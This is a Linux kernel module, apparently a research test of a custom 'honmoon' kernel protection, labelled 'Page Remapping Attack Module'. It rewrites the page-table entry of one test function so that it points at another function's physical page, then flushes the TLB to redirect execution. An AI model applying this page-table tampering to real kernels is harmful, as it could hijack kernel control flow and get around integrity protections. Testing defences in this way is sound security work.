#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <asm/pgtable.h>
#include <asm/page.h>
#include <asm/tlbflush.h>
#include <asm/honmoon.h>

static int __init remap_init(void)
{
	unsigned int level;
	pte_t *pte;
	unsigned long pa_test_2;
	unsigned long va_test_1 = (unsigned long)honmoon_test_remap_1;
	unsigned long new_val;

	pr_info("Module loaded.\n");
	pr_info("Calling honmoon_test_remap_1() first time: %d\n", honmoon_test_remap_1());

	pte = lookup_address(va_test_1, &level);
	if (!pte) {
		pr_err("Failed to lookup PTE for honmoon_test_remap_1.\n");
		return -EINVAL;
	}

	if (level != PG_LEVEL_4K) {
		pr_err("honmoon_test_remap_1 is not mapped at 4K level (level=%d).\n", level);
	}

	pr_info("PTE found at %p, value: %lx\n", pte, pte_val(*pte));

	pa_test_2 = __pa_symbol(honmoon_test_remap_2);
	pr_info("Physical address of honmoon_test_remap_2: %lx\n", pa_test_2);

	new_val = (pte_val(*pte) & ~PTE_PFN_MASK) | (pa_test_2 & PTE_PFN_MASK);

	pr_info("Modifying PTE. Old: %lx, New: %lx\n", pte_val(*pte), new_val);

	set_pte(pte, __pte(new_val));

	__flush_tlb_all();
	pr_info("TLB flushed.\n");

	pr_info("Calling honmoon_test_remap_1() second time: %d\n", honmoon_test_remap_1());

	return 0;
}
module_init(remap_init);

static void __exit remap_exit(void)
{
	pr_info("Module unloaded.\n");
}
module_exit(remap_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jonguk Cheong");
MODULE_DESCRIPTION("Page Remapping Attack Module");
